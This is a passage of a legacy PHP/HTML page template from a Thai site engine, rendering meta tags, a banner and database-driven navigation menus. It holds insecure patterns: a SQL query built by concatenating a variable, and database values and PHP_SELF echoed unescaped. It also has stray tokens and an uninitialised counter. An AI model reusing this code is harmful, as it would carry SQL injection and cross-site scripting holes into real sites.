<?php include("global.php"); ?>
<?php set_page($s_page,$e_page=15); //นำส่วนนี้ิไว้ด้านบน ?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:og="http://opengraphprotocol.org/schema/"
      xmlns:fb="http://www.facebook.com/2008/fbml"><!-- InstanceBegin template="/Templates/detail_temp.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<?php
	$q="SELECT * FROM `setting`";
	$db->query($q);
	$db->next_record();
		$meta_des=$db->f(web_descript);
		$meta_keyword=$db->f(web_keyword);
		$meta_title=$db->f(web_title);
		$webname=$_SERVER['SERVER_NAME'];
		$pagename=$_SERVER['PHP_SELF'];
?> 
<title><?=l?> ::: <?=$meta_title?> ::: [Engine by ThaiWebEasy.com]</title>
<META http-equiv=Content-Type content="text/html; charset=utf-8">
<meta property="og:title" content="<?=ํ?><?=$meta_title?>"/>
<meta property="og:image" content="http://<?=$webname?>/img/product/<?=$meta_pic?>"/>
<meta property="og:url" content="http://<?=$webname?><?=$pagename?>?id_product=<?=$id_product?>"/>
<meta property="og:site_name" content="<?=ํ?><?=$meta_title?>"/>
<meta property="og:description" content="<?=$meta_des?>"/>
<META content=All name=ROBOTS>
<META content="<?=$meta_des?>" name=description>
<META content="<?=$meta_keyword?>" name=keywords />
<?php
include("jvs.php");
?>
<?php
include("css.php");
?>
<!-- InstanceBeginEditable name="head" -->
<title></title>
<!-- InstanceEndEditable -->
<?php
	$q="SELECT * FROM `bg_co` WHERE 1";
	$db->query($q);
	if($db->num_rows()>0){
		$db->next_record();
		$bgg_color=$db->f(name_co);
		$_SESSION['block_color']=$db->f(name_co2);
	}
?>	
<script language="javascript" src="js/valid.js"></script>
<script type="text/javascript" src="js/FlashObject.js"></script>
<script src="Scripts/swfobject_modified.js" type="text/javascript"></script>
</head>
<body <?=$iSetBG?>>
<div id="wrapper">
<table width="1000" border="0" align="center"  cellpadding="0" cellspacing="0">
  <tr>
    <td valign="top">

<table width="1000" height="100%" border="0" align="center" cellpadding="0" cellspacing="0">
  <tbody>
<?php
function g_menu($db,$s_id){
	$q="SELECT * FROM `menu` WHERE id_menu=".$s_id." ";
	$db->query($q);
	$db->next_record();
	$db->p(name_menu);
}
?>
    <tr>
      <td height="100%"><table width="1000" border="0" cellspacing="0" cellpadding="0">
		
        <tr>
          <td align="left" valign="top">
<table width="100%" cellpadding="0" cellspacing="0">
                
                <?php
$db333301=new nDB();
$q="SELECT * FROM `bg_co` WHERE 1";
$db333301->query($q);
$db333301->next_record();
$sh_mooo=$db333301->f(sho_topm);
$sh_areao=$db333301->f(sho_aream); ?>

<?php if($sh_areao==0){ ?>
                <tr>
				<td><table width="100%" border="0" cellspacing="0" cellpadding="0">
				  <?php if($sh_mooo==4){ ?>
                  <tr>
				    <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>

<?php 
$q="SELECT * FROM `menu` WHERE 1 ORDER BY menu_order LIMIT 0,7";
$db->query($q);
$vj=1;
while($db->next_record()){
?>		  		
		<?
		
		if($db->f(menu_url)==''){
			$url="menu_detail.php?menu_id=".$db->f(id_menu);
			$tar=$db->f(target_menu);
			if($tar=='2'){
				$target="_blank";
			}else{
				$target="_parent";
			}
		}else{
			$url=$db->f(menu_url);
		}
		?>	  
<?php if($vj%7==1){ ?>				
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==2){ ?>				  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==3){ ?>						  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==4){ ?>						  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==5){ ?>			  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  
<?php if($vj%7==6){ ?>			  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>	
<?php if($vj%7==0){ ?>			  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>					  
<?php $vj++; } ?>					  			
</tr>
<tr>

<?php 
$q="SELECT * FROM `menu` WHERE 1 ORDER BY menu_order LIMIT 7,7";
$db->query($q);
$vj=1;
while($db->next_record()){
?>		  		
		<?
		
		if($db->f(menu_url)==''){
			$url="menu_detail.php?menu_id=".$db->f(id_menu);
			$tar=$db->f(target_menu);
			if($tar=='2'){
				$target="_blank";
			}else{
				$target="_parent";
			}
		}else{
			$url=$db->f(menu_url);
		}
		?>	  
<?php if($vj%7==1){ ?>				
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==2){ ?>				  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==3){ ?>						  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==4){ ?>						  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==5){ ?>			  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  
<?php if($vj%7==6){ ?>			  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>	
<?php if($vj%7==0){ ?>			  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>					  
<?php $vj++; } ?>					  			
</tr>
				      </table></td>
				    </tr>
                   <?php } ?> 
				  <?php  if($sh_mooo==1 || $sh_mooo==3 ){ ?>
                  <tr>
				    <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
				      <tr>
				       <?php 
$q="SELECT * FROM `menu` WHERE 1 ORDER BY menu_order LIMIT 0,7";
$db->query($q);
$vj=1;
while($db->next_record()){
?>		  			 
		<?
		
		if($db->f(menu_url)==''){
			$url="menu_detail.php?menu_id=".$db->f(id_menu);
			$tar=$db->f(target_menu);
			if($tar=='2'){
				$target="_blank";
			}else{
				$target="_parent";
			}
		}else{
			$url=$db->f(menu_url);
		}
		?> 
<?php if($vj%7==1){ ?>				
              <td width="145" height="36" align="center" id="<?=(basename($_SERVER['PHP_SELF'])==$db->f(url_menu))?"top_menu3":"top_menu4"?>" style="padding-right:5px"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
<?php } ?>			  			  
<?php if($vj%7==2){ ?>				  
              <td width="145" height="26" align="center" id="<?=(basename($_SERVER['PHP_SELF'])==$db->f(url_menu))?"top_menu3":"top_menu4"?>"style="padding-right:5px"><a href="<?=$url?>" target="<?=$target?>"> <?=$db->f(name_menu)?></a></td>
<?php } ?>			  			  
<?php if($vj%7==3){ ?>						  
              <td width="145" height="26" align="center" id="<?=(basename($_SERVER['PHP_SELF'])==$db->f(url_menu))?"top_menu3":"top_menu4"?>"style="padding-right:5px"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
<?php } ?>			  			  
<?php if($vj%7==4){ ?>						  
              <td width="145" height="26" align="center" id="<?=(basename($_SERVER['PHP_SELF'])==$db->f(url_menu))?"top_menu3":"top_menu4"?>"style="padding-right:5px"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
<?php } ?>			  			  
<?php if($vj%7==5){ ?>			  
              <td width="145" height="26" align="center" id="<?=(basename($_SERVER['PHP_SELF'])==$db->f(url_menu))?"top_menu3":"top_menu4"?>"style="padding-right:5px"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
<?php } ?>			  
<?php if($vj%7==6){ ?>			  
              <td width="145" height="26" align="center" id="<?=(basename($_SERVER['PHP_SELF'])==$db->f(url_menu))?"top_menu3":"top_menu4"?>"style="padding-right:5px"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
<?php } ?>	
<?php if($vj%7==0){ ?>			  
              <td width="145" height="26" align="center" id="<?=(basename($_SERVER['PHP_SELF'])==$db->f(url_menu))?"top_menu3":"top_menu4"?>"style="padding-right:5px"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
<?php } ?>					  
<?php $vj++; } ?>					 
				        </tr>
				      </table></td>
				    </tr>
                   <?php } ?> 
				  <?php  if($sh_mooo==2 || $sh_mooo==3 ){ ?>	
                  <tr>
				    <td id="top_menu2" height="33"><table width="100%" border="0" cellspacing="0" cellpadding="0">
				      <tr>
<?php 
$q="SELECT * FROM `menu` WHERE 1 ";
$db9999=new nDB();
$db9999->query($q);
$tototo=$db9999->num_rows();
?>
				        <?php 
$q="SELECT * FROM `menu` WHERE 1 ORDER BY menu_order LIMIT 7,7";
$db->query($q);
$vj=1;
while($db->next_record()){
?>		  			 
		<?
		
		if($db->f(menu_url)==''){
			$url="menu_detail.php?menu_id=".$db->f(id_menu);
			$tar=$db->f(target_menu);
			if($tar=='2'){
				$target="_blank";
			}else{
				$target="_parent";
			}
		}else{
			$url=$db->f(menu_url);
		}
		?> 
<?php if($vj2%7==1){ ?>						
                  <td  width="150" height="36" align="center" style="padding-top:8px;">
				  <a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a>				   </td>
				  <?php if($tototo<7){ ?>		
				  <?php } ?>  
<?php } ?>			  			  
<?php if($vj2%7==2){ ?>						  
                  <td width="150" align="center" style="padding-top:8px;"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
				  <?php if($tototo<8){ ?>		
				  <?php } ?>  				  
<?php } ?>			  			  
<?php if($vj2%7==3){ ?>						  
                  <td width="150" align="center" style="padding-top:8px;"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
				  <?php if($tototo<9){ ?>		
				  <?php } ?>  						  
<?php } ?>			  			  
<?php if($vj2%7==4){ ?>						  
                  <td width="150" align="center" style="padding-top:8px;"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
				  <?php if($tototo<10){ ?>		
				  <?php } ?>  						  
<?php } ?>			  			  
<?php if($vj2%7==5){ ?>						  
                  <td width="150" align="center" style="padding-top:8px;"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
				  <?php if($tototo<11){ ?>		
				  <?php } ?>  		
<?php } ?>			  			  
<?php if($vj2%7==6){ ?>							  
                  <td width="150" align="center" style="padding-top:8px;"><a href="<?=$url?>" target="<?=$target?>"> <?=$db->f(name_menu)?></a></td>
<?php } ?>	
<?php if($vj2%7==0){ ?>							  
                  <td width="150" align="center" style="padding-top:8px;"><a href="<?=$url?>" target="<?=$target?>"> <?=$db->f(name_menu)?></a></td>
<?php } ?>			  
<?php $vj2++; } ?>				  		 
				        </tr>
				      </table></td>
				    </tr>
                   <?php } ?>                    
					
				  </table></td>
				</tr>
<?php } ?>                
<tr>
<td>
<table width="1000" border="0" cellpadding="0" cellspacing="0">
<?php 
$q="SELECT * FROM `setting` WHERE 1 ";
$db88=new nDB();
$db88->query($q);
$db88->next_record();
?>
<?php
	$q="SELECT * FROM `logo` WHERE status_logo=1 ORDER BY RAND()";
	$db->query($q);
	$db->next_record();
?>
       <tr>
              
							<?php $chk=substr($db->f(name_logo),-3); ?>							
							<?php if($chk=="jpg" || $chk=="gif" or $chk=="png"){ ?>
			  <td colspan="7" align="left" valign="top" height="<?=$db88->f(height_logo)?>" style="background:url(<?=$db->f(name_logo)?>)"></td>
			  				<?php } ?>
							<?php if($chk=="swf"){ 
							$path=$db->f(name_logo);
							?><td colspan="8" align="left" valign="top">
  <object id="FlashID" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="1000" height="<?=$db88->f(height_logo)?>">
    <param name="movie" value="<?=$path?>" />
    <param name="quality" value="high" />
    <param name="wmode" value="opaque" />
    <param name="swfversion" value="8.0.35.0" />
    <!-- This param tag prompts users with Flash Player 6.0 r65 and higher to download the latest version of Flash Player. Delete it if you don’t want users to see the prompt. -->
    <param name="expressinstall" value="Scripts/expressInstall.swf" />
    <!-- Next object tag is for non-IE browsers. So hide it from IE using IECC. -->
    <!--[if !IE]>-->
    <object type="application/x-shockwave-flash" data="<?=$path?>" width="1000" height="<?=$db88->f(height_logo)?>">
      <!--<![endif]-->
      <param name="quality" value="high" />
      <param name="wmode" value="opaque" />
      <param name="swfversion" value="8.0.35.0" />
      <param name="expressinstall" value="Scripts/expressInstall.swf" />
      <!-- The browser displays the following alternative content for users with Flash Player 6.0 and older. -->
      <div>
        <h4>Content on this page requires a newer version of Adobe Flash Player.</h4>
        <p><a href="http://www.adobe.com/go/getflashplayer"><img src="http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" alt="Get Adobe Flash player" width="112" height="33" /></a></p>
      </div>
      <!--[if !IE]>-->
    </object>
    <!--<![endif]-->
  </object> </td>																
			  				<?php } ?>				  
              </tr>	
          </table>	</td></tr>                        
<?php if($sh_areao==1){ ?>
<tr>
				<td><table width="100%" border="0" cellspacing="0" cellpadding="0">
				  <?php if($sh_mooo==4){ ?>
                  <tr>
				    <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>

<?php 
$q="SELECT * FROM `menu` WHERE 1 ORDER BY menu_order LIMIT 0,7";
$db->query($q);
$vj=1;
while($db->next_record()){
?>		  		
		<?
		
		if($db->f(menu_url)==''){
			$url="menu_detail.php?menu_id=".$db->f(id_menu);
			$tar=$db->f(target_menu);
			if($tar=='2'){
				$target="_blank";
			}else{
				$target="_parent";
			}
		}else{
			$url=$db->f(menu_url);
		}
		?>	  
<?php if($vj%7==1){ ?>				
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==2){ ?>				  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==3){ ?>						  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==4){ ?>						  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==5){ ?>			  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  
<?php if($vj%7==6){ ?>			  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>	
<?php if($vj%7==0){ ?>			  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>					  
<?php $vj++; } ?>					  			
</tr>
<tr>

<?php 
$q="SELECT * FROM `menu` WHERE 1 ORDER BY menu_order LIMIT 7,7";
$db->query($q);
$vj=1;
while($db->next_record()){
?>		  		
		<?
		
		if($db->f(menu_url)==''){
			$url="menu_detail.php?menu_id=".$db->f(id_menu);
			$tar=$db->f(target_menu);
			if($tar=='2'){
				$target="_blank";
			}else{
				$target="_parent";
			}
		}else{
			$url=$db->f(menu_url);
		}
		?>	  
<?php if($vj%7==1){ ?>				
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==2){ ?>				  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==3){ ?>						  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==4){ ?>						  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  			  
<?php if($vj%7==5){ ?>			  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>			  
<?php if($vj%7==6){ ?>			  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>	
<?php if($vj%7==0){ ?>			  
              <td width="145" height="26" align="center" valign="middle"  ><a href="<?=$url?>" target="<?=$target?>"><img src="<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>"  onmouseover="this.src='<?=($db->f(pic2)!="")?"img/menu/".$db->f(pic2):"img/menu/defualt.jpg"?>'" onmouseout="this.src='<?=($db->f(pic1)!="")?"img/menu/".$db->f(pic1):"img/menu/defualt.jpg"?>'"  border="0" alt="<?=$db->f(name_menu)?>" /></a></td>
<?php } ?>					  
<?php $vj++; } ?>					  			
</tr>
				      </table></td>
				    </tr>
                   <?php } ?> 
				  <?php  if($sh_mooo==1 || $sh_mooo==3 ){ ?>
                  <tr>
				    <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
				      <tr>
				       <?php 
$q="SELECT * FROM `menu` WHERE 1 ORDER BY menu_order LIMIT 0,7";
$db->query($q);
$vj=1;
while($db->next_record()){
?>		  			 
		<?
		
		if($db->f(menu_url)==''){
			$url="menu_detail.php?menu_id=".$db->f(id_menu);
			$tar=$db->f(target_menu);
			if($tar=='2'){
				$target="_blank";
			}else{
				$target="_parent";
			}
		}else{
			$url=$db->f(menu_url);
		}
		?> 
<?php if($vj%7==1){ ?>				
              <td width="145" height="36" align="center" id="<?=(basename($_SERVER['PHP_SELF'])==$db->f(url_menu))?"top_menu3":"top_menu4"?>" style="padding-right:5px"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
<?php } ?>			  			  
<?php if($vj%7==2){ ?>				  
              <td width="145" height="26" align="center" id="<?=(basename($_SERVER['PHP_SELF'])==$db->f(url_menu))?"top_menu3":"top_menu4"?>"style="padding-right:5px"><a href="<?=$url?>" target="<?=$target?>"> <?=$db->f(name_menu)?></a></td>
<?php } ?>			  			  
<?php if($vj%7==3){ ?>						  
              <td width="145" height="26" align="center" id="<?=(basename($_SERVER['PHP_SELF'])==$db->f(url_menu))?"top_menu3":"top_menu4"?>"style="padding-right:5px"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
<?php } ?>			  			  
<?php if($vj%7==4){ ?>						  
